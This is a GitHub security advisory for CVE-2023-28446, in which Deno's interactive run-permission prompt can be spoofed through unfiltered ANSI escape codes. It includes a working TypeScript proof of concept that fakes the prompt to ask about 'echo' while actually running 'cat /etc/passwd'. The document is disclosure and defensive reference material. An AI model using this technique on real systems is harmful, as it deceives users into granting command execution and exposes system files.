# [H] Interactive `run` permission prompt spoofing via improper ANSI neutralization

## Summary
Severity: High
Advisory: GHSA-vq67-rp93-65qf
CVE: CVE-2023-28446
CWE: CWE-150
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-vq67-rp93-65qf
Type: github-advisory

## Affected
- crates.io: `deno_runtime` — affected >=1.8.0 <1.31.2
- crates.io: `deno` — affected >=1.8.0 <1.31.2

## Details
### Summary
Arbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a `op_spawn_child` or `op_kill` prompt and replace it with any desired text.

### Details

The main entry point comes down to the ability to override what the API control says ([40_process.js](https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175)). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in `op_kill`.

### PoC

This PoC works on 1.31.1, but modified versions of it work on older versions.

Make a file, e.g. `index.ts`, that uses this vulnerability to spoof the `op_spawn_child` permission prompt

```ts
const boldANSI = "\u001b[1m" // bold
const unboldANSI = "\u001b[22m" // unbold

const prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to "echo"${unboldANSI}
├ Requested by \`Deno.Command().output()`

const moveANSIUp = "\u001b[1A" // moves to the start of the line
const clearANSI = "\u001b[2K" // clears the line
const moveANSIStart = "\u001b[1000D" // moves to the start of the line

Deno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({
    cmd: "cat",
    args: ["/etc/passwd"],
    clearEnv: false,
    env: [],
    stdin: "null",
    stdout: "inherit",
    stderr: "piped"
}, moveANSIUp + clearANSI + moveANSIStart + prompt)
```

Run the file with `deno run index.ts`.

### Impact
Any Deno program is able to spoof the interactive permission prompt for the `op_spawn_child` or the `op_kill` action (which indirectly gives access to all run commands) by overriding the `Requested by {message} API` with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:

```
// Expected Prompt
┌ ⚠️  Deno requests run access to "cat"
├ Requested by `Deno.Command().output()` API
├ Run again with --allow-run to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) >

// Actual Prompt
┌ ⚠️  Deno requests run access to "echo"
├ Requested by `Deno.Command().output()` API
├ Run again with --allow-run to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) >
```

This works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.

This problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).

Before `v1.31.0`, this requires the `--unstable` flag.

## References
- https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf
- https://nvd.nist.gov/vuln/detail/CVE-2023-28446
- https://github.com/denoland/deno
- https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175
- https://github.com/denoland/deno/releases/tag/v1.31.2
